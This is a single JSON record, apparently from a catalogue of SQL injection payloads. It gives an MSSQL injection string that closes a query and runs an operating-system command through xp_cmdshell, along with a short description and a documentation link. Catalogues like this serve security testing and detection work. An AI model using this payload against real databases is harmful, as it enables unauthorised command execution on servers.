  {"id": "sqli-097", "family": "sqli", "subtype": "file_operation", "payload_string": "'; EXEC xp_cmdshell 'dir'-- ", "context": "MSSQL command execution via xp_cmdshell", "description": "Execute OS commands using MSSQL xp_cmdshell", "references": ["https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql"]},
